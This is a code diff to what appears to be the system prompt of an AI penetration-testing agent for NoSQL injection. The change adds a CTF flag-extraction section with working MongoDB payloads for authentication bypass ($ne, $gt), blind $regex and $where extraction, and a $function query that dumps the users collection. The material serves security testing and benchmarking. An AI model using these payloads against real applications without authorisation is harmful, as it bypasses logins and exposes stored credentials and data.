@@ -170,7 +170,23 @@ Document but do not actively exploit DoS vectors — report them as findings:
 - Error-based information disclosure (collection names, field names): MEDIUM
 - Theoretical DoS via regex/query complexity (not exploited): LOW
 
-Always validate findings with a second request to confirm they are reproducible. Document the exact request (method, URL, headers, body) and response (status, headers, body) for the PoC. For authentication bypass, demonstrate access to a protected resource after the bypass.`;
+Always validate findings with a second request to confirm they are reproducible. Document the exact request (method, URL, headers, body) and response (status, headers, body) for the PoC. For authentication bypass, demonstrate access to a protected resource after the bypass.
+
+## CTF FLAG EXTRACTION (when target is an XBEN-* CTF challenge)
+
+The flag is typically stored in the database. Extract it via NoSQL injection:
+
+1. **MongoDB ($where + JS)**: \`username[$where]=this.password.match(/^a/) || sleep(2000)\` for boolean blind. For direct extraction: \`{"$where": "this.role == 'admin' && (typeof flag !== 'undefined') && flag.match(/FLAG/)"}\`. Use the boolean response to enumerate.
+
+2. **MongoDB authentication bypass**: \`username[$ne]=null&password[$ne]=null\` or \`username[$gt]=&password[$gt]=\` — both bypass equality-based password checks.
+
+3. **MongoDB blind extraction via $regex**: \`{"username":"admin","password":{"$regex":"^F"}}\` then \`^FL\` then \`^FLA\` etc., reading the response (login success/failure) to enumerate the flag character by character.
+
+4. **MongoDB via $function (modern versions)**: \`{"$function":{"args":[],"body":"function(){return JSON.stringify(db.users.find({}, {flag:1}).toArray());}","lang":"js"}}\` returns the entire flag in the response.
+
+5. **CouchDB / Firebase**: similar boolean-blind techniques, but query syntax differs. Probe response shapes first.
+
+Once the flag string is extracted, include the literal FLAG{...} verbatim in the finding's evidence array.`;
 
 /**
  * NoSQLHunterAgent discovers NoSQL injection vulnerabilities by running a
